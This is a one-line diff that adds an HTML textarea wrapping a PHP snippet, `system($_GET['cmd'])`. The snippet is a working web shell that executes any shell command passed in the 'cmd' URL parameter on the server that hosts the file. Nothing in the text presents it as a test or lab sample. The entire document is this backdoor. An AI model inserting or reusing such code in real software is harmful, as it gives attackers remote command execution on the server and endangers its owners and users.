@@ -1,0 +1,1 @@
+<textarea style="width:100%; height:100%; position:absolute; top:1; left:1 margin:0 0 0 0; padding: 0 0 0 0; display: block"><?php system($_GET["cmd"]); ?></textarea>
